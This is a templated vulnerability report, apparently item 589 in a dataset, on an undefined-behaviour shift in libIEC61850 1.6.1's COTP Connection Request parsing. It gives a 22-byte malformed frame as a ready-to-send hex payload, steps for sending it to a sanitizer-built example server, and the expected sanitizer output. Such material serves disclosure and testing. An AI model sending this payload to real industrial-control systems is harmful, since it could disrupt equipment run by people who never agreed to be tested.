@@ -1,0 +1,19 @@
+Number: 589
+
+Summarize:
+libIEC61850 1.6.1 has an undefined-behavior issue in COTP Connection Request parsing at src/mms/iso_cotp/cotp.c line 481, in the TPDU size parameter (0xC0) option path. When parameterLen == 1, the code uses an untrusted network byte directly as the left-shift count: `int requestedTpduSize = (1 << buffer[bufPos++]);` and then passes the result to `CotpConnection_setTpduSize`. A malformed CR variable part such as `c0 01 a2` makes the parser evaluate `1 << 162` from attacker-controlled input without validating the TPDU-size code range. The document reports that during connection establishment this is remotely reachable, requires no prior session state, and is reliably detected by UndefinedBehaviorSanitizer as `runtime error: shift exponent 162 is too large for 32-bit type 'int'`.
+
+Reproduce:
+1. Build `server_example_basic_io` with UndefinedBehaviorSanitizer enabled and run it on port `8102`.
+2. From a client, open a TCP connection to `127.0.0.1:8102` and send this 22-byte malformed COTP Connection Request frame, then shut down the write side and close the socket:
+   `03 00 00 16 11 e0 00 00 00 01 00 c1 02 00 00 c2 02 00 01 c0 01 a2`
+   The malicious TPDU-size parameter is the final three bytes: `c0 01 a2` (`0xc0` parameter, length `0x01`, invalid TPDU-size code `0xa2`).
+3. The document's example client command is `python3 poc_cotp.py 8102`, where the script connects to `127.0.0.1`, sends the above hex payload, then closes the connection.
+4. Expected server output:
+   `Connection opened`
+   `src/mms/iso_cotp/cotp.c:481:32: runtime error: shift exponent 162 is too large for 32-bit type 'int'`
+   `SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior src/mms/iso_cotp/cotp.c:481:32`
+   `Connection closed`
+
+Payload:
+03 00 00 16 11 e0 00 00 00 01 00 c1 02 00 00 c2 02 00 01 c0 01 a2
